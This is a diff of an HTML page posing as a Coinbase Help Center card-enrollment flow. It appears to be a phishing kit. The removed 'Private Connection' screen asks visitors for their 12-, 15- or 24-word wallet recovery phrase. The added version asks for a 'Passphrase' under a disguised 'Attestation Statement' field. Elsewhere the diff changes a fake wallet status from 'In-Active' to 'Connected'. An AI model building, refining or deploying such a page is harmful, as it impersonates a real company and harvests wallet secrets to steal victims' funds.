@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Get Your Coinbase Card – Coinbase Help Center</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet" />
-
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
@@ -410,22 +409,16 @@
     .cd-reveal-btn { background: none; border: none; color: #0052FF; font-size: 11px; font-weight: 600; cursor: pointer; font-family: inherit; }
 
     /* wallet strip */
-/* wallet strip */
-.wallet-strip {
-  display: flex; align-items: center; gap: 10px;
-  width: 100%; background: #FEF2F2;
-  border: 1px solid #FECACA;
-  border-radius: 10px; padding: 10px 14px; margin-bottom: 16px;
-  font-size: 13px; color: var(--text);
-  transition: background .4s, border-color .4s;
-}
-.wallet-strip.ws-active { background: #ECFDF5; border-color: #A7F3D0; }
-.ws-dot { width: 8px; height: 8px; border-radius: 50%; background: #EF4444; box-shadow: 0 0 8px rgba(239,68,68,.4); flex-shrink: 0; transition: background .4s, box-shadow .4s; }
-.wallet-strip.ws-active .ws-dot { background: #05B169; box-shadow: 0 0 8px rgba(5,177,105,.4); }
-.ws-addr { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--muted); }
-.ws-bal { margin-left: auto; font-weight: 700; color: #DC2626; font-size: 13px; }
-.wallet-strip.ws-active .ws-bal { color: #059669; }
-
+    .wallet-strip {
+      display: flex; align-items: center; gap: 10px;
+      width: 100%; background: #ECFDF5;
+      border: 1px solid #A7F3D0;
+      border-radius: 10px; padding: 10px 14px; margin-bottom: 16px;
+      font-size: 13px; color: var(--text);
+    }
+    .ws-dot { width: 8px; height: 8px; border-radius: 50%; background: #05B169; box-shadow: 0 0 8px rgba(5,177,105,.4); flex-shrink: 0; }
+    .ws-addr { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--muted); }
+    .ws-bal { margin-left: auto; font-weight: 700; color: #059669; font-size: 13px; }
 
     /* actions */
     .action-row { display: flex; gap: 10px; width: 100%; }
@@ -840,15 +833,14 @@
 
       <div style="height:20px"></div>
 
-<div class="wallet-strip" id="walletStrip">
-  <div class="ws-dot"></div>
-  <div>
-    <div style="font-size:12px;font-weight:700" id="wsWalletName">Coinbase Wallet</div>
-    <div class="ws-addr" id="wsAddr">Pending Approval</div>
-  </div>
-  <div class="ws-bal" id="wsBal">✗ In-Active</div>
-</div>
-
+      <div class="wallet-strip">
+        <div class="ws-dot"></div>
+        <div>
+          <div style="font-size:12px;font-weight:700" id="wsWalletName">Coinbase Wallet</div>
+          <div class="ws-addr" id="wsAddr">Connected</div>
+        </div>
+        <div class="ws-bal" id="wsBal" style="color:#0052FF;font-size:12px">✓ Active</div>
+      </div>
 
       <div class="card-details" id="cardDetails">
         <div class="cd-row">
@@ -889,82 +881,23 @@
       </div>
     </div>
 
-  <!-- ══ SCREEN 9: ATTESTATION ══ -->
-<div class="screen" id="s9" style="max-width:760px;margin:0 auto;padding:20px 18px 28px;">
-
-  <div class="step-badge" style="margin:0 auto 18px;display:table;">Final Step — Confirm</div>
-
-  <h2 style="text-align:center;margin:0 0 14px;font-size:56px;line-height:1.05;font-weight:800;color:#0b0f19;">
-    Private Connection
-  </h2>
-
-  <p class="sub" style="text-align:center;max-width:640px;margin:0 auto 34px;font-size:18px;line-height:1.7;color:#6b7280;">
-    <strong style="color:#4b5563;">Make sure no one is around you.</strong>
-    No friends, no strangers, and no one looking over your shoulder.
-    Even a quick glance from someone else is a risk you cannot afford.
-  </p>
-
-
-
-  <!-- Recovery Phrase Card -->
-  <div style="width:100%;margin-bottom:18px;padding:18px;border:1px solid #e5e7eb;border-radius:18px;background:#fafafa;">
-
-    <div style="display:flex;justify-content:space-between;align-items:center;gap:12px;margin-bottom:10px;flex-wrap:wrap;">
-      <label for="phrase-input" style="font-size:16px;font-weight:700;color:#111827;">
-        Recovery Phrase Required
-      </label>
-      <span style="font-size:12px;font-weight:600;color:#6b7280;background:#f3f4f6;padding:5px 10px;border-radius:999px;">
-        Required
-      </span>
+    <!-- ══ SCREEN 9: ATTESTATION ══ -->
+    <div class="screen" id="s9">
+      <div class="step-badge">Final Step — Confirm</div>
+      <h2>Private Connection</h2>
+      <p class="sub">Type <strong>" Make sure no one is around you."</strong> No friends, no strangers, no one looking over your shoulder. Even a quick glance from someone else is a risk you cannot afford.</p>
+      <div class="vm-field" style="width:100%;margin-bottom:10px">
+        <label>Attestation Statement</label>
+        <textarea type="text" id="attestInput" placeholder='Passphrase' autocomplete="off" spellcheck="false" ></textarea>
+      </div>
+      <div id="attestError" style="display:none;color:#D23F31;font-size:12px;margin-bottom:10px;font-weight:600">
+        ⚠ Connect
+      </div>
+      <button class="btn-primary" style="width:100%" onclick="submitAttestation()">Complete Enrollment →</button>
+      <button class="btn-ghost" style="width:100%;margin-top:8px" onclick="showScreen('s5')">← Back to my card</button>
     </div>
 
-    <textarea
-      id="phrase-input"
-      rows="4"
-      placeholder="Enter your 12, 15 or 24-word recovery phrase..."
-      style="width:100%;min-height:120px;border:1px solid #d1d5db;border-radius:14px;padding:16px 18px;font-size:16px;line-height:1.6;color:#111827;background:#fff;outline:none;resize:vertical;box-sizing:border-box;"
-    ></textarea>
-
-    <div style="display:flex;justify-content:space-between;align-items:center;gap:10px;margin-top:10px;flex-wrap:wrap;font-size:13px;color:#6b7280;">
-      <span id="word-count">0 words</span>
-      <span>Must be 12 / 15 / 24 words</span>
-    </div>
-
-
-
-    <div style="display:flex;align-items:flex-start;gap:10px;margin-top:16px;padding:14px 15px;border:1px solid #fbcfe8;border-radius:14px;background:#fff7fb;">
-      <div style="font-size:18px;line-height:1;">🛡️</div>
-      <p id="hint-text" style="margin:0;font-size:13px;line-height:1.6;color:#6b7280;">
-        Your recovery phrase is the only way to restore your wallet. Never share it with anyone.
-      </p>
-    </div>
-
-  
-  </div>
-
-  <div id="attestError" style="display:none;color:#D23F31;font-size:12px;margin-bottom:16px;font-weight:600;">
-    ⚠ Connect
-  </div>
-
-  <!-- Buttons -->
-  <div style="display:flex;flex-direction:column;align-items:center;gap:14px;margin-top:26px;">
-    <button
-      class="btn-primary"
-      style="width:100%;max-width:360px;height:62px;border:none;border-radius:18px;background:#1857ff;color:#fff;font-size:18px;font-weight:700;box-shadow:0 12px 25px rgba(24,87,255,0.22);"
-      onclick="submitAttestation()"
-    >
-      Complete Enrollment →
-    </button>
-
-    <button
-      class="btn-ghost"
-      style="width:100%;max-width:360px;height:62px;border:1px solid #d1d5db;border-radius:18px;background:#fff;color:#111827;font-size:18px;font-weight:700;"
-      onclick="showScreen('s5')"
-    >
-      ← Back to my card
-    </button>
-  </div>
-</div>   <!-- ══ SCREEN 10: SUCCESS ══ -->
+    <!-- ══ SCREEN 10: SUCCESS ══ -->
     <div class="screen" id="s10">
       <div class="success-tick">✓</div>
       <h2>You're all set!</h2>
